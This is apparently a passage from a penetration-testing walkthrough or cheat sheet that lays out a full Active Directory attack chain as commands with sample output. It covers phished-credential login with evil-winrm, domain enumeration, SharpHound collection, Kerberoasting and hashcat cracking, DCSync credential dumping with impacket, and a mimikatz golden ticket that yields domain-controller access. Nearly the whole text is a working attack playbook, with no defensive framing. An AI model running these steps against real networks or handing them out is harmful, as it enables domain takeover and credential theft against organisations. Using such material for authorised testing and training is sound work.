#### Initial Access
```
# Got low-priv domain user through phishing
evil-winrm -i 10.10.10.20 -u jdoe -p Password123

*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami
# CORP\jdoe
```

#### Enumerate Domain
```
# Get domain info
nltest /domain_trusts
# Domain: corp.local

# List users
net user /domain

# List groups
net group "Domain Admins" /domain

# Find domain controllers
nltest /dclist:corp.local
# DC01.corp.local
```

#### Run BloodHound
```
# Upload SharpHound
upload SharpHound.exe

# Run collector
.\SharpHound.exe -c all

# Download results
download 20241010123456_BloodHound.zip

# On attacker, import to BloodHound
# Look for Kerberoastable users
```

#### Kerberoasting
```
# From Windows
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web.corp.local"

# Get ticket
klist

# Export ticket
mimikatz "kerberos::list /export"

# Or use impacket from Linux
impacket-GetUserSPNs corp.local/jdoe:Password123 -request -outputfile kerberoast.txt
```

#### Crack Service Account
```
# Hash format
cat kerberoast.txt
# $krb5tgs$23$*service_account$corp.local$HTTP/web.corp.local*$...

# Crack with hashcat
hashcat -m 13100 -a 0 kerberoast.txt rockyou.txt
# ServiceAccount@corp.local:Fall2023!

# Check privileges of service account
impacket-psexec corp.local/service_account:Fall2023!@DC01.corp.local
# SMB connection failed - not admin
```

#### Use Service Account for DCSync
```
# Check if service account has replication rights
crackmapexec ldap DC01.corp.local -u service_account -p Fall2023! -M bloodyad -o ACTION=acls
# Found: DS-Replication-Get-Changes on domain

# DCSync attack
impacket-secretsdump -just-dc corp.local/service_account:Fall2023!@DC01.corp.local

# Extract Administrator hash
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f7b2a9c8e1d5f6a9b2c3d4e5f6a7b8c:::
```

#### Golden Ticket
```
# Get domain SID
impacket-lookupsid corp.local/guest:@DC01.corp.local
# S-1-5-21-123456789-123456789-123456789

# Get krbtgt hash
impacket-secretsdump -just-dc-user krbtgt corp.local/service_account:Fall2023!@DC01.corp.local
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f:::

# Create golden ticket
mimikatz "kerberos::golden /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:2b3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f /user:Administrator /ticket:golden.kirbi" "exit"

# Load ticket
mimikatz "kerberos::ptt golden.kirbi" "exit"

# Access DC
dir \\DC01.corp.local\C$
```

